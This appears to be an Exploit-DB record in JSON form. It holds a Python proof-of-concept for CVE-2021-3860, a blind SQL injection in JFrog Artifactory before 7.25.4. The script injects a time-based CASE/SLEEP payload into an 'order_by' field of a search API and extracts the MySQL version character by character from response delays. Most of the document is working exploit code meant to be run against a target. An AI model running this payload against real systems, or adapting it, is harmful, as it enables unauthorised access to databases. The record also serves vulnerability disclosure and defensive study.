{"source": "https://www.exploit-db.com/exploits/51806", "vulnName": "JFrog Artifactory < 7.25.4 - Blind SQL Injection", "vulnEDBID": "51806", "vulnCVE": "N/A", "author": "ARDR", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-19", "vulnContent": "# Exploit Title: artifactory low-privileged blind sql injection\n# Google Dork:\n# Date: \n# Exploit Author: ardr\n# Vendor Homepage:https://jfrog.com/help/r/jfrog-release-information/cve-2021-3860-artifactory-low-privileged-blind-sql-injection\n# Software Link: https://jfrog.com/help/r/jfrog-release-information/cve-2021-3860-artifactory-low-privileged-blind-sql-injection\n# Version: JFrog Artifactory prior to 7.25.4\n# Tested on: MySQL\n# CVE : CVE-2021-3860\n\nimport requests, string, time\nfrom sys import stdout,exit\nimport warnings\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\n# written by 75fc58fa86778461771d2ff7f68b28259e97ece9bf6cd8be227c70e6a6140314c97d3fdac30b290c6b10d3679c5ba890635a1ca6fa23c83481dfc1257cd062fd\n# old script for CVE-2021-3860\n# log into artifactory with any user.  there must be populated data in the system.  a fresh install will not work.\n# you will need to be able to capture a valid request to the below endpoint in order to run this script.\n# once captured, replace the cookies and headers below\n\n\nwarnings.simplefilter('ignore',InsecureRequestWarning)\n\n\nsession = requests.session()\nbase = input(\"Please enter the base url: \")\nurl = f\"{base}/ui/api/v1/global-search/bundles/received?$no_spinner=true\"\n# headers = Replace this with captured headers from the above endpoint \npos = 1\n# cookies = Replace this with captured cookies from the above endpoint \n\n\nwhile True:\n    for i in string.digits + '.':\n        data={\"after\": \"\", \"before\": \"\", \"direction\": \"asc\", \"name\": \"*\", \"num_of_rows\": 100, \"order_by\": f\"(select*from(select((CASE WHEN (MID(VERSION(),{pos},1) = '{i}') THEN SLEEP(5) ELSE 4616 END)))a)\"}\n        start = time.time()\n        r = session.post(url, headers=headers, cookies=cookies, json=data, verify=False)\n        request_time = time.time() - start\n        if request_time > 5:\n            version += i\n            pos += 1\n            stdout.write(i)\n            stdout.flush()\n            break\n        if len(version) >= 6:\n            stdout.write(\"\\n\")\n            print(f\"Version found: MySQL {version}\")\n            exit(0)\n            "}